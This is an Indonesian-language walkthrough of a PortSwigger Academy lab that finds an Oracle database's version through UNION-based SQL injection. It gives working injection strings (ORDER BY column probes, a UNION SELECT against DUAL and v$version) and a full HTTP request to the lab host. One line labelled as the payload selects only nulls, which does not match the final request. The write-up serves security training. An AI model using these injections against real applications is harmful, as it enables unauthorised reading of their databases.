# [PortSwigger Academy] SQL Injection - Lab #3

## 📌 Detail Lab
* **Nama Tantangan:** SQL injection attack, querying the database type and version on Oracle
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** SQL Injection (SQLi)
* **Tujuan Lab:** Menggunakan serangan UNION-Based SQLi untuk mengekstrak informasi tipe dan versi database pada sistem yang menggunakan Oracle Database.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Celah terjadi pada parameter filter kategori. Karena input dari pengguna langsung digabungkan ke dalam kueri SQL, kita dapat menggunakan operator `UNION` untuk menggabungkan hasil kueri asli dengan kueri tambahan buatan kita.

### Karakteristik Oracle Database:
1. **Wajib Klausa `FROM`:** Tidak seperti MySQL atau PostgreSQL, Oracle wajib menyertakan klausa `FROM` pada setiap perintah `SELECT`. Jika ingin melakukan *query* tanpa tabel riil, Oracle menyediakan tabel bawaan bernama `DUAL`.
2. **Kueri Versi:** Informasi versi pada Oracle disimpan di dalam tabel `v$version`.

---

## 2. Langkah Eksploitasi & PoC

### Menentukan Jumlah Kolom Kueri Asli
Sebelum menggunakan `UNION`, kita harus memastikan jumlah kolom yang dikembalikan oleh kueri asli sama dengan jumlah kolom kueri `UNION` kita. Saya menggunakan teknik `ORDER BY` pada parameter kategori di Burp Repeater:

* `category=Gifts' ORDER BY 1--` (Status: 200 OK)
* `category=Gifts' ORDER BY 2--` (Status: 200 OK)
* `category=Gifts' ORDER BY 3--` (Status: 500 Internal Server Error)

**Analisis:** Karena `ORDER BY 3` menghasilkan error, ini membuktikan bahwa kueri asli backend mengembalikan **2 kolom**.

### Menentukan Tipe Data Kolom (Mencari Kolom String)
Kita harus memastikan kolom tersebut menerima tipe data teks (String) agar bisa menampilkan informasi versi. Karena ini database Oracle, kita wajib menyertakan `FROM dual`:

* `category=Gifts' UNION SELECT 'a', 'a' FROM dual--`

**Analisis:** Aplikasi merespons dengan status 200 OK dan menampilkan karakter 'a' pada halaman web. Ini membuktikan **kedua kolom menerima tipe data string**.

### Injeksi Payload Eksfiltrasi Data (Oracle Version)
Setelah mengetahui ada 2 kolom dan keduanya menerima string, kita masukkan kueri untuk mengambil versi dari tabel `v$version`:

* **Payload:** `' UNION SELECT null, null FROM v$version--`

Request HTTP final di Burp Repeater:
```http
GET /filter?category=Accessories' UNION SELECT BANNER, null FROM v$version-- HTTP/2
Host: 0a7b00fd04ad7e0180773a750036009d.web-security-academy.net
```

### Hasil Eksekusi Database
```
SELECT * FROM products WHERE category = 'Accessories' UNION SELECT BANNER, null FROM v$version--' AND released = 1
```
Hasil Akhir: Aplikasi menampilkan teks versi database Oracle (contoh: CORE 11.2.0.2.0 Production atau Oracle Database 11g Express Edition...) di layar browser. Lab berhasil diselesaikan (Solved).
